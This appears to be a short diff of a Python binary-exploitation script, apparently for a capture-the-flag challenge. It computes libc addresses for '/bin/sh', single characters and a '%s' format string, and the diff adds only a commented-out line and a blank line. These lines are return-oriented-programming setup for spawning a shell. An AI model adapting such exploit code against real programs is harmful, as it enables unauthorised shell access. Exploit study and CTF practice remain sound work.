@@ -51,7 +51,9 @@ bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
 I_addr = libc_base + next(libc.search(b'I'))
 d_addr = libc_base + next(libc.search(b'd'))
 i_addr = libc_base + next(libc.search(b'i'))
+#t_addr = libc_base + next(libc.search(b't'))
 t_addr = libc_base + next(libc.search(b'T'))
+
 exclamation_addr = libc_base + next(libc.search(b'!'))
 
 format_string = libc_base + next(libc.search(b'%s'))
